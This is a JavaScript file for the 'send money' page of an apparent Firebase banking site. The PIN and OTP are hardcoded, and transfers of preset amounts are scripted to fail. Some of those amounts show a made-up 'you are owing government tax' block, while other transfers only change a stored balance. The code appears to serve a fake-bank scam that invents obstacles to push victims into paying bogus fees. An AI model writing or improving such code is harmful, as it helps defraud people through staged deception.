// send-money.js

import { auth, db } from "./firebase.js";
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-auth.js";
import {
  collection,
  addDoc,
  getDoc,
  updateDoc,
  doc,
} from "https://www.gstatic.com/firebasejs/10.12.1/firebase-firestore.js";
import { getCachedUser, fetchUser } from "./userCache.js";

const form = document.getElementById("send-money-form");
const pinModal = document.getElementById("pin-modal");
const pinConfirmBtn = document.getElementById("pin-confirm");
const otpScreen = document.getElementById("otp-screen");
const otpSubmitBtn = document.getElementById("otp-submit");
const pageLoader = document.getElementById("page-loader");
const toast = document.getElementById("toast");

const FIXED_PIN = "6502";
const FIXED_OTP = "023228";

const OTP_TRIGGER_AMOUNTS = [
  2500, 5000, 7500, 10000, 12500, 15000, 17500, 20000,
];

const BLOCKED_AMOUNTS = [2700, 5200, 7700, 10200, 12700, 15200, 17700, 20200];

let currentUser;
let transactionData = {};

const showModal = (modal) => modal.classList.add("modal-active");
const hideModal = (modal) => modal.classList.remove("modal-active");

const showLoader = (msg = "Processing your request...") => {
  pageLoader.querySelector("p").textContent = msg;
  pageLoader.classList.add("active");
};

const hideLoader = () => pageLoader.classList.remove("active");

const showToast = (msg, duration = 3000) => {
  toast.textContent = msg;
  toast.classList.add("active");
  setTimeout(() => toast.classList.remove("active"), duration);
};

// Auth & cached user
onAuthStateChanged(auth, async (user) => {
  if (!user) return (window.location.href = "signin.html");
  currentUser = getCachedUser() || (await fetchUser(user.uid));
});

// Firestore reference
const transactionsRef = collection(db, "transactions");

// Helper to simulate 3s loading for all buttons
const delayAction = (fn) => {
  showLoader();
  setTimeout(() => {
    hideLoader();
    fn();
  }, 3000);
};

// Form submit
form.addEventListener("submit", (e) => {
  e.preventDefault();

  const amount = parseFloat(form["amount"].value.trim());

  transactionData = {
    sender: currentUser.name,
    receiver: form["recipientName"].value.trim(),
    recipientAccount: form["recipientAccount"].value.trim(),
    recipientBank: form["recipientBank"].value.trim(),
    amount,
    note: form["note"].value.trim(),
    status: "Failed",
  };

  if (
    !transactionData.receiver ||
    !transactionData.recipientAccount ||
    !transactionData.recipientBank ||
    !amount
  ) {
    showToast("Please fill all required fields.");
    return;
  }

  // 🔹 PIN first, then handle Insufficient Funds
  showModal(pinModal);
});

// 🔹 PIN & OTP auto-focus
const pinBoxes = document.querySelectorAll(".pin-box");
const otpBoxes = document.querySelectorAll(".otp-box");

pinBoxes.forEach((box, idx) => {
  box.addEventListener("input", () => {
    if (box.value.length === 1 && idx < pinBoxes.length - 1)
      pinBoxes[idx + 1].focus();
  });
});

otpBoxes.forEach((box, idx) => {
  box.addEventListener("input", () => {
    if (box.value.length === 1 && idx < otpBoxes.length - 1)
      otpBoxes[idx + 1].focus();
  });
});

// PIN confirm
pinConfirmBtn.addEventListener("click", () => {
  delayAction(() => {
    const pin = Array.from(pinBoxes)
      .map((b) => b.value)
      .join("");

    if (pin !== FIXED_PIN) {
      showToast("❌ Incorrect PIN");
      return;
    }

    hideModal(pinModal);
    pinBoxes.forEach((b) => (b.value = ""));

    const amount = transactionData.amount;

    // 🔹 Insufficient funds after PIN
    if (amount > currentUser.balance) {
      showLoader("Verifying transaction...");

      setTimeout(() => {
        hideLoader();

        const msgBox = document.createElement("div");
        msgBox.style.position = "fixed";
        msgBox.style.top = "50%";
        msgBox.style.left = "50%";
        msgBox.style.transform = "translate(-50%, -50%)";
        msgBox.style.padding = "20px 30px";
        msgBox.style.background = "#ffe5e5";
        msgBox.style.color = "#b00000";
        msgBox.style.fontWeight = "600";
        msgBox.style.borderRadius = "8px";
        msgBox.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
        msgBox.textContent =
          "❌ Insufficient funds to complete this transaction!";

        document.body.appendChild(msgBox);
        setTimeout(() => msgBox.remove(), 5000);
      }, 3000);

      return;
    }

    // 🔹 Blocked amount after PIN
    if (BLOCKED_AMOUNTS.includes(amount)) {
      showLoader("Verifying transaction...");

      setTimeout(() => {
        hideLoader();

        document.body.innerHTML = `
          <div style="display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;flex-direction:column;font-family:Arial,sans-serif;">
            <h1 style="color:red; font-weight:600; margin-bottom:20px;">🚫 Transaction Blocked</h1>
            <p style="font-size:1.1rem; max-width:400px; margin-bottom:30px;">
              You are owing government tax. Please clear your tax obligations to proceed with transactions.
            </p>
            <button id="goHomeBtn" style="padding:12px 25px; font-size:1rem; border:none; border-radius:6px; background:#0077cc; color:white; cursor:pointer;">
              Go Back
            </button>
          </div>
        `;

        document
          .getElementById("goHomeBtn")
          .addEventListener(
            "click",
            () => (window.location.href = "index.html")
          );
      }, 3000);

      return;
    }

    // 🔹 OTP modal if required
    if (OTP_TRIGGER_AMOUNTS.includes(amount)) {
      showModal(otpScreen);
    } else {
      processTransaction("Success");
    }
  });
});

// OTP confirm
otpSubmitBtn.addEventListener("click", () => {
  delayAction(() => {
    const otp = Array.from(otpBoxes)
      .map((b) => b.value)
      .join("");

    if (otp !== FIXED_OTP) {
      showToast("❌ Incorrect OTP");
      return;
    }

    hideModal(otpScreen);
    otpBoxes.forEach((b) => (b.value = ""));

    processTransaction("Failed"); // Force failure for OTP-triggered amounts
  });
});

// Final transaction handler
async function processTransaction(status) {
  showLoader("Processing transaction...");
  transactionData.status = status;

  try {
    const docRef = await addDoc(transactionsRef, {
      ...transactionData,
      userId: currentUser?.uid,
      date: new Date().toISOString(),
    });

    const snap = await getDoc(docRef);
    const savedTx = snap.data();
    savedTx.id = docRef.id;

    // Save transaction including receiver details entered in form
    localStorage.setItem("transaction-details", JSON.stringify(savedTx));

    hideLoader();

    if (status === "Success") {
      const newBalance = (currentUser.balance || 0) - transactionData.amount;

      currentUser.balance = newBalance;
      localStorage.setItem("userData", JSON.stringify(currentUser));

      const userRef = doc(db, "users", currentUser.uid);
      await updateDoc(userRef, { balance: newBalance });

      showToast("✅ Transaction Successful!");
    } else {
      showToast("❌ Transaction Failed!");
    }

    setTimeout(() => (window.location.href = "t-details.html"), 500);
  } catch (err) {
    hideLoader();
    showToast("❌ Transaction failed: " + err.message, 5000);
  }
}
